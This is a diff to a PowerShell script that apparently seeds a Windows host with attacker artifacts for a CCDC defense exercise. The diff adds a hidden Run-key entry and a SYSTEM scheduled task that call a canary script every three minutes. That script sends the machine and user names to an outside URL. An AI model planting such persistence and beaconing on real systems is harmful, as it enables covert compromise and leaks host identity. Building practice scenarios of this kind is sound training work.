@@ -20,14 +20,17 @@ $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
 
 # Redhavi: escenario de practica CCDC para Windows 10/11 y Windows Server.
-$script:ScenarioVersion = 3
-$script:ExpectedChecks = 10
+$script:ScenarioVersion = 5
+$script:ExpectedChecks = 11
 $script:TaskName = "Redhavi-IndexRefresh"
+$script:CanaryTaskName = "Redhavi-CanaryCheckin"
+$script:CanaryIntervalMinutes = 3
 $script:RunKeyPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 $script:RunValueName = "RedhaviIndexRefresh"
 $script:ApacheServiceName = "RedhaviApache"
 $script:StateDir = Join-Path $env:ProgramData "redhavi"
 $script:StateFile = Join-Path $script:StateDir "state-win.json"
+$script:CanaryScript = Join-Path $script:StateDir "redhavi-registry-canary.ps1"
 $script:KeyReference = Join-Path $script:StateDir "administrator-key.pub"
 $script:AuthorizedKeys = Join-Path $env:ProgramData "ssh\administrators_authorized_keys"
 $script:StateStarted = $false
@@ -107,9 +110,12 @@ function Write-State {
         root_key_blob    = $script:RootKeyBlob
         task_name        = $script:TaskName
         refresh_url      = $script:RefreshUrl
+        canary_task_name = $script:CanaryTaskName
+        canary_interval  = $script:CanaryIntervalMinutes
         run_key_path     = $script:RunKeyPath
         run_value_name   = $script:RunValueName
         canary_url       = $script:CanaryUrl
+        canary_script    = $script:CanaryScript
         apache_service   = $script:ApacheServiceName
     }
 
@@ -353,8 +359,19 @@ function Setup-RefreshTask {
 function Setup-RegistryPersistence {
     Write-Log "Creando persistencia de inicio de sesion en el registro..."
     $escapedCanaryUrl = $script:CanaryUrl.Replace("'", "''")
-    $separator = if ($escapedCanaryUrl.Contains("?")) { "&" } else { "?" }
-    $command = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"try { `$uri = '$escapedCanaryUrl${separator}host=' + [Uri]::EscapeDataString(`$env:COMPUTERNAME) + '&user=' + [Uri]::EscapeDataString(`$env:USERNAME); Invoke-WebRequest -UseBasicParsing -Uri `$uri | Out-Null } catch { }`""
+    $canaryContent = @(
+        '$ErrorActionPreference = "SilentlyContinue"',
+        "`$baseUrl = '$escapedCanaryUrl'",
+        '$separator = if ($baseUrl.Contains("?")) { "&" } else { "?" }',
+        '$uri = $baseUrl + $separator + "host=" + [Uri]::EscapeDataString($env:COMPUTERNAME) + "&user=" + [Uri]::EscapeDataString($env:USERNAME)',
+        'Invoke-WebRequest -UseBasicParsing -Uri $uri | Out-Null'
+    )
+    $canaryContent | Set-Content -LiteralPath $script:CanaryScript -Encoding UTF8
+
+    $command = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:CanaryScript)`""
+    if ($command.Length -gt 260) {
+        throw "La linea de registro del canary excede el limite de 260 caracteres."
+    }
     New-Item -Path $script:RunKeyPath -Force | Out-Null
     New-ItemProperty `
         -Path $script:RunKeyPath `
@@ -362,6 +379,18 @@ function Setup-RegistryPersistence {
         -PropertyType String `
         -Value $command `
         -Force | Out-Null
+}
+
+function Setup-PeriodicCanaryTask {
+    Write-Log "Creando la llamada periodica al canary cada $($script:CanaryIntervalMinutes) minutos..."
+    $command = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:CanaryScript)`""
+    Invoke-Native -FilePath "schtasks.exe" -Arguments @(
+        "/Create", "/TN", $script:CanaryTaskName,
+        "/SC", "MINUTE", "/MO", [string]$script:CanaryIntervalMinutes,
+        "/RU", "SYSTEM", "/RL", "HIGHEST",
+        "/TR", $command,
+        "/F"
+    )
 }
 
 function Get-AdministratorsGroup {
@@ -554,11 +583,28 @@ function Test-RegistryPersistenceSeeded {
         return $false
     }
     $value = [string]$property.Value
+    if (-not (Test-Path -LiteralPath $script:CanaryScript -PathType Leaf)) {
+        return $false
+    }
+    $canaryContent = Get-Content -LiteralPath $script:CanaryScript -Raw -ErrorAction Stop
     return (
-        $value.Contains($script:CanaryUrl) -and
-        $value.Contains('$env:COMPUTERNAME') -and
-        $value.Contains('$env:USERNAME')
+        $value.Contains($script:CanaryScript) -and
+        $canaryContent.Contains($script:CanaryUrl) -and
+        $canaryContent.Contains('$env:COMPUTERNAME') -and
+        $canaryContent.Contains('$env:USERNAME')
     )
+}
+
+function Test-PeriodicCanaryTaskSeeded {
+    $task = Get-ScheduledTask -TaskName $script:CanaryTaskName -ErrorAction SilentlyContinue
+    if (-not $task) {
+        return $false
+    }
+    $actionText = ($task.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join " "
+    $hasInterval = [bool]($task.Triggers | Where-Object {
+        $_.Repetition.Interval -eq "PT$($script:CanaryIntervalMinutes)M"
+    })
+    return $actionText.Contains($script:CanaryScript) -and $hasInterval
 }
 
 function Invoke-PostValidation {
@@ -568,6 +614,7 @@ function Invoke-PostValidation {
         @{ Label = "usuario splunk habilitado y administrador"; Test = { Test-LabUserSeeded "splunk" } },
         @{ Label = "tarea programada implantada"; Test = { Test-RefreshTaskSeeded } },
         @{ Label = "persistencia de registro implantada"; Test = { Test-RegistryPersistenceSeeded } },
+        @{ Label = "tarea de canary cada tres minutos implantada"; Test = { Test-PeriodicCanaryTaskSeeded } },
         @{ Label = "payload PHP valido"; Test = { Test-PayloadValid $script:IndexPath } },
         @{ Label = "payload PHP bloqueado"; Test = { Test-LabFileLocked $script:IndexPath } },
         @{ Label = "llave SSH exacta implantada"; Test = { Test-KeyFileHasBlob $script:AuthorizedKeys $script:RootKeyBlob } },
@@ -623,6 +670,9 @@ function Invoke-Redhavi {
 
     $script:CurrentStep = "persistencia de registro"
     Setup-RegistryPersistence
+
+    $script:CurrentStep = "tarea periodica del canary"
+    Setup-PeriodicCanaryTask
 
     $script:CurrentStep = "usuarios"
     Setup-LabUsers
